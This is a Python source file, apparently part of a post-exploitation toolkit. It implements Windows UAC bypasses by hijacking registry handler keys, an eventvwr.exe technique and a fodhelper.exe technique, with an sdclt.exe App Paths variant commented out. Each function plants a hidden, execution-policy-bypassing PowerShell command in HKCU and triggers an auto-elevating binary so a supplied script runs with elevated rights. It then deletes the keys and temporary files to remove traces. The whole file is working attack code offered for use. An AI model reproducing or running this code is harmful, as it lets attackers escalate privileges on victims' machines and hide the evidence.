import os
import time
import subprocess
from _winreg import *
import ctypes

def deleteTHisRemoteFile(tmp_files):
    for file in tmp_files:
        try:
            os.remove(file)
        except Exception, e:
            pass

def get_env_variables():
    try:
        tmp = os.path.expandvars("%TEMP%")
    except:
        tmp = os.path.expandvars("%APPDATA%")

    sysroot = os.path.expandvars("%SYSTEMROOT%")

    return tmp, sysroot


def registry_hijacking_eventvwr(mainPowershellScriptRemotePath, files_to_delete):
    #   '''
    #   Based on Invoke-EventVwrBypass, thanks to enigma0x3 (https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/)
    #   '''
    HKCU = ConnectRegistry(None, HKEY_CURRENT_USER)
    powershellPath = '%s\\system32\\WindowsPowerShell\\v1.0\\powershell.exe' % os.path.expandvars("%SYSTEMROOT%")
    mscCmdPath = "Software\Classes\mscfile\shell\open\command"
    cmd = "{1} -w hidden -noni -nop -ExecutionPolicy Bypass -File {0}".format(mainPowershellScriptRemotePath, powershellPath)

    try:
        # The registry key already exist in HKCU, altering...
        key = OpenKey(HKCU, mscCmdPath, KEY_SET_VALUE)
    except:
        # Adding the registry key in HKCU
        key = CreateKey(HKCU, mscCmdPath)

    registry_key = OpenKey(HKCU, mscCmdPath, 0, KEY_WRITE)
    SetValueEx(registry_key, '', 0, REG_SZ, cmd)
    CloseKey(registry_key)

    # Executing eventvwr.exe
    eventvwrPath = os.path.join(os.environ['WINDIR'],'System32','eventvwr.exe')
    output = subprocess.check_output(eventvwrPath, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell = True)

    # Sleeping 5 secds...
    time.sleep(5)

    #Clean everything
    DeleteKey(HKCU, mscCmdPath)
    deleteTHisRemoteFile(files_to_delete)

"""
def registry_hijacking_appPath(mainPowershellScriptRemotePath, files_to_delete):
    '''
    '''
    tmp, sysRoot = get_env_variables()
    HKCU = ConnectRegistry(None, HKEY_CURRENT_USER)
    appPathsPath = "Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"
    powershellPath = '%s\\system32\\WindowsPowerShell\\v1.0\\powershell.exe' % sysRoot
    cmd = "{0} -w hidden -noni -nop  -ExecutionPolicy Bypass -File {1}".format(powershellPath, mainPowershellScriptRemotePath)
    cmdPath = "{0}\\temp.bat".format(tmp)

    try:
        # The registry key already exist in HKCU, altering...
        key = OpenKey(HKCU, appPathsPath, KEY_SET_VALUE)
    except:
        # Adding the registry key in HKCU
        key = CreateKey(HKCU, appPathsPath)

    registry_key = OpenKey(HKCU, appPathsPath, 0, KEY_WRITE)
    SetValueEx(registry_key, '', 0, REG_SZ, cmdPath)
    CloseKey(registry_key)

    #Creates cmd file
    f=open(cmdPath, "w")
    f.write(cmd)
    f.close()

    # Creation sdclt.exe path
    triggerPath = os.path.join(os.environ['WINDIR'],'System32','sdclt.exe')
    #Disables file system redirection for the calling thread (File system redirection is enabled by default)
    wow64 = ctypes.c_long(0)
    ctypes.windll.kernel32.Wow64DisableWow64FsRedirection(ctypes.byref(wow64))
    # Executing sdclt.exe
    output = subprocess.check_output(triggerPath, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell = True)
    #Enable file system redirection for the calling thread
    ctypes.windll.kernel32.Wow64EnableWow64FsRedirection(wow64)

    # Sleeping 5 secds...
    time.sleep(5)

    #Clean everything
    DeleteKey(HKCU, appPathsPath)
    deleteTHisRemoteFile(files_to_delete)
    deleteTHisRemoteFile([cmdPath])
"""

def registry_hijacking_fodhelper(mainPowershellScriptRemotePath, files_to_delete):
    '''
    '''
    tmp, sysRoot = get_env_variables()
    HKCU = ConnectRegistry(None, HKEY_CURRENT_USER)
    fodhelperPath = "Software\Classes\ms-settings\Shell\Open\command"
    powershellPath = '%s\\system32\\WindowsPowerShell\\v1.0\\powershell.exe' % sysRoot
    cmd = "{0} -w hidden -noni -nop  -ExecutionPolicy Bypass -File {1}".format(powershellPath, mainPowershellScriptRemotePath)
    cmdPath = "{0}\\temp.bat".format(tmp)

    try:
        # The registry key already exist in HKCU, altering...
        key = OpenKey(HKCU, fodhelperPath, KEY_SET_VALUE)
    except:
        # Adding the registry key in HKCU
        key = CreateKey(HKCU, fodhelperPath)

    registry_key = OpenKey(HKCU, fodhelperPath, 0, KEY_WRITE)
    SetValueEx(registry_key, 'DelegateExecute', 0, REG_SZ, "")
    SetValueEx(registry_key, '', 0, REG_SZ, cmdPath)
    CloseKey(registry_key)

    #Creates cmd file
    f=open(cmdPath, "w")
    f.write(cmd)
    f.close()

    # Creation fodhelper.exe path
    triggerPath = os.path.join(os.environ['WINDIR'],'System32','fodhelper.exe')
    #Disables file system redirection for the calling thread (File system redirection is enabled by default)
    wow64 = ctypes.c_long(0)
    ctypes.windll.kernel32.Wow64DisableWow64FsRedirection(ctypes.byref(wow64))
    # Executing fodhelper.exe
    output = subprocess.check_output(triggerPath, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell = True)
    #Enable file system redirection for the calling thread
    ctypes.windll.kernel32.Wow64EnableWow64FsRedirection(wow64)

    # Sleeping 5 secds...
    time.sleep(5)

    #Clean everything
    DeleteKey(HKCU, fodhelperPath)
    deleteTHisRemoteFile(files_to_delete)
    deleteTHisRemoteFile([cmdPath])
